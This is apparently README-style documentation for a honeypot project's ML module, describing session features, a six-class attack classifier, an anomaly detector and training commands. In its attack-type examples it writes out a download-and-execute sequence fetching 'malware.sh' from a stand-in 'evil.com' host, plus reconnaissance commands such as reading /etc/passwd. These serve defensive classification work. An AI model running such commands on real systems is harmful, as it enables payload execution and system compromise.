# Machine Learning Capabilities

This honeypot system includes advanced ML capabilities for attack analysis, classification, and anomaly detection.

## Overview

The ML module provides:

1. **Feature Engineering** - Extracts 30+ features from attack sessions
2. **Attack Classification** - Categorizes attacks into 6 types
3. **Anomaly Detection** - Identifies unusual attack patterns
4. **Training Pipeline** - End-to-end model training workflow
5. **Data Export** - Export datasets for external ML tools

## Features Extracted

### Temporal Features
- `hour_of_day` - Hour when attack occurred (0-23)
- `day_of_week` - Day of week (0-6, Monday=0)
- `is_weekend` - Whether attack occurred on weekend
- `duration_seconds` - Session duration

### Network Features
- `src_port` - Source port number
- `dst_port` - Destination port

### Geographic Features
- `has_geolocation` - Whether IP was geolocated
- `country` - Country name
- `latitude` / `longitude` - Geographic coordinates

### Login Attempt Features
- `login_attempt_count` - Number of login attempts
- `successful_login` - Whether any login succeeded
- `failed_login_count` - Number of failed attempts
- `login_velocity` - Attempts per minute
- `unique_usernames` - Number of unique usernames tried
- `unique_passwords` - Number of unique passwords tried
- `credential_diversity` - Combined username/password diversity

### Command Execution Features
- `command_count` - Total commands executed
- `command_velocity` - Commands per minute
- `recon_commands` - Reconnaissance command count
- `download_commands` - Download attempt count
- `persistence_commands` - Persistence mechanism count
- `execution_commands` - Execution command count
- `privilege_escalation_commands` - Privilege escalation attempts
- `unique_commands` - Number of unique commands
- `command_repetition_rate` - How repetitive commands are

### Download Features
- `download_count` - Files downloaded
- `has_downloads` - Whether any downloads occurred

### Behavioral Features
- `avg_time_between_commands` - Average time between commands
- `std_time_between_commands` - Standard deviation of timing
- `min_time_between_commands` - Minimum time gap
- `max_time_between_commands` - Maximum time gap

### Bot/Human Indicators
- `is_likely_bot` - Binary indicator for bot behavior
- `is_predictable` - Whether behavior is predictable

### Sophistication Score
- `sophistication_score` - Overall attack sophistication (0-10)

## Attack Classification

The classifier categorizes attacks into 6 types:

### 1. Brute Force (Label 0)
**Characteristics:**
- Many login attempts (>10)
- Few or no commands executed
- Automated credential guessing

**Example:**
- 50+ login attempts with common passwords
- No successful authentication
- No commands executed

### 2. Reconnaissance (Label 1)
**Characteristics:**
- Many reconnaissance commands
- Information gathering focus
- No execution or downloads

**Example:**
- Commands: `uname -a`, `cat /etc/passwd`, `ifconfig`, `ps aux`
- Mapping system configuration
- No malicious actions taken

### 3. Malware Deployment (Label 2)
**Characteristics:**
- Download commands present
- File downloads detected
- Execution attempts

**Example:**
- `wget http://evil.com/malware.sh`
- `chmod +x malware.sh`
- `./malware.sh`

### 4. Persistence (Label 3)
**Characteristics:**
- Persistence mechanism commands
- Establishing continued access
- May include cron jobs, startup scripts

**Example:**
- `crontab -e`
- Modifying `.bashrc`
- Creating systemd services

### 5. Bot (Label 4)
**Characteristics:**
- Very fast execution (<1s between commands)
- Predictable patterns
- Automated behavior
- Simple attack patterns

**Example:**
- Rapid-fire login attempts
- Identical command sequences
- No variation in timing

### 6. Advanced (Label 5)
**Characteristics:**
- High sophistication score (≥5)
- Multiple attack techniques
- Human operator indicators
- Complex command sequences

**Example:**
- Custom exploits
- Multi-stage attacks
- Evidence of manual interaction

## Anomaly Detection

The anomaly detector uses Isolation Forest to identify unusual patterns:

### What It Detects

- **Unusual timing patterns** - Different from normal attack timing
- **Novel command combinations** - New attack techniques
- **Atypical geographic origins** - Attacks from unexpected locations
- **Strange behavioral patterns** - Deviations from known attack types

### Anomaly Scores

- **Score < threshold**: Anomaly (unusual attack)
- **Score ≥ threshold**: Normal (typical attack pattern)

Lower scores indicate more anomalous behavior.

## Usage

### 1. Train Models

```bash
# Train both classifier and anomaly detector
python backend/ml/training.py --mode both

# Train only classifier
python backend/ml/training.py --mode classifier

# Train only anomaly detector
python backend/ml/training.py --mode anomaly

# Export dataset for external tools
python backend/ml/training.py --mode export
```

### 2. Programmatic Usage

```python
from backend.ml.training import ModelTrainer
from backend.ml.models import AttackClassifier, AnomalyDetector
from backend.ml.feature_engineering import FeatureEngineer

# Initialize
trainer = ModelTrainer()

# Train models
classifier_metrics = trainer.train_classifier()
anomaly_metrics = trainer.train_anomaly_detector()

# Export dataset
export_info = trainer.export_dataset()
```

### 3. Using Trained Models

```python
# Load trained models
classifier = AttackClassifier(model_path='models/attack_classifier.pkl')
anomaly_detector = AnomalyDetector(model_path='models/anomaly_detector.pkl')

# Prepare features
feature_engineer = FeatureEngineer()
features = feature_engineer.extract_session_features(session_data)

# Classify attack
X = np.array([list(features.values())])
attack_type = classifier.predict_label(X)[0]
print(f"Attack type: {attack_type}")

# Check for anomalies
is_anomalous = anomaly_detector.is_anomalous(X)[0]
print(f"Anomalous: {is_anomalous}")
```

## Data Export Formats

### CSV Format
```csv
session_id,src_ip,login_attempt_count,command_count,sophistication_score,label,label_name
session_001,1.2.3.4,15,3,2,0,brute_force
session_002,5.6.7.8,2,8,5,1,reconnaissance
```

### JSON Lines Format
```json
{"session_id": "session_001", "src_ip": "1.2.3.4", "login_attempt_count": 15, ...}
{"session_id": "session_002", "src_ip": "5.6.7.8", "login_attempt_count": 2, ...}
```

## Jupyter Notebooks

Interactive analysis notebooks are provided:

```bash
# Start Jupyter
jupyter notebook

# Open notebooks/01_exploratory_analysis.ipynb
```

Notebooks include:
- Data loading and exploration
- Feature distribution analysis
- Correlation analysis
- PCA visualization
- Attack pattern clustering

## Model Performance

### Typical Performance Metrics

With sufficient training data (>1000 samples):

**Attack Classifier:**
- Training Accuracy: 85-95%
- Test Accuracy: 80-90%
- Works best with balanced class distribution

**Anomaly Detector:**
- Anomaly Rate: 5-10% (adjustable)
- Identifies truly novel attacks
- Improves with more training data

## Feature Importance

After training, you can see which features matter most:

```python
importance = classifier.get_feature_importance()
report = feature_engineer.get_feature_importance_report(
    feature_names, importance
)
print(report)
```

Typically important features:
1. `sophistication_score`
2. `command_count`
3. `login_attempt_count`
4. `download_commands`
5. `persistence_commands`

## Advanced Usage

### Semi-Supervised Learning

Start with automated labeling, then manually refine:

```python
# Get automated labels
labels = trainer.create_labels(df)

# Manually review and correct
# ... edit labels.csv ...

# Retrain with corrected labels
classifier.train(X, corrected_labels, feature_names)
```

### Custom Features

Add domain-specific features:

```python
class CustomFeatureEngineer(FeatureEngineer):
    def extract_session_features(self, session_data):
        features = super().extract_session_features(session_data)

        # Add custom feature
        features['custom_metric'] = self.calculate_custom_metric(session_data)

        return features
```

### Model Ensemble

Combine multiple models for better performance:

```python
from sklearn.ensemble import VotingClassifier

# Create ensemble
ensemble = VotingClassifier([
    ('rf', classifier1.model),
    ('gb', classifier2.model),
    ('xgb', classifier3.model)
], voting='soft')
```

## Integration with Dashboard

ML predictions can be integrated into the dashboard:

1. **Real-time Classification** - Classify attacks as they occur
2. **Anomaly Alerts** - Highlight unusual attacks
3. **Attack Type Distribution** - Show classified attack breakdown
4. **Threat Scoring** - Score attacks by sophistication

See `dashboard/routes/api.py` for ML integration examples.

## Best Practices

### Data Collection
- Collect data for at least 2-4 weeks before training
- Aim for 500+ attack sessions minimum
- Ensure diverse attack types are represented

### Model Training
- Retrain models weekly as new data arrives
- Validate models on holdout data
- Monitor for concept drift (attack patterns changing)

### Feature Engineering
- Normalize features with similar scales
- Handle missing values appropriately
- Remove highly correlated features

### Production Deployment
- Save models with versioning (v1, v2, etc.)
- A/B test new models before full deployment
- Monitor model performance metrics
- Set up alerts for degraded performance

## Troubleshooting

### "Not enough training data"
- Need at least 10-20 sessions for classifier
- Run honeypot longer or use sample data
- Consider semi-supervised learning

### "Poor classification accuracy"
- Check class balance (use `df['label'].value_counts()`)
- Increase training data collection
- Manually label a subset for better training

### "Too many false positives in anomaly detection"
- Adjust contamination parameter (default 0.1)
- Collect more baseline data
- Retrain with updated normal patterns

## Future Enhancements

Potential ML additions:
- Deep learning for command sequence analysis
- LSTM networks for temporal patterns
- Graph neural networks for attack chains
- Transfer learning from external threat data
- Federated learning across multiple honeypots

## Resources

- **scikit-learn docs**: https://scikit-learn.org/
- **Feature Engineering Guide**: https://www.kaggle.com/learn/feature-engineering
- **Anomaly Detection**: https://scikit-learn.org/stable/modules/outlier_detection.html
- **Random Forest**: https://scikit-learn.org/stable/modules/ensemble.html#forest

## Citation

If you use this ML framework in research, please cite:

```bibtex
@software{honeypot_ml_2024,
  author = {Your Name},
  title = {Honeypot Attack Analysis with Machine Learning},
  year = {2024},
  url = {https://github.com/yourusername/honeypot-project}
}
```
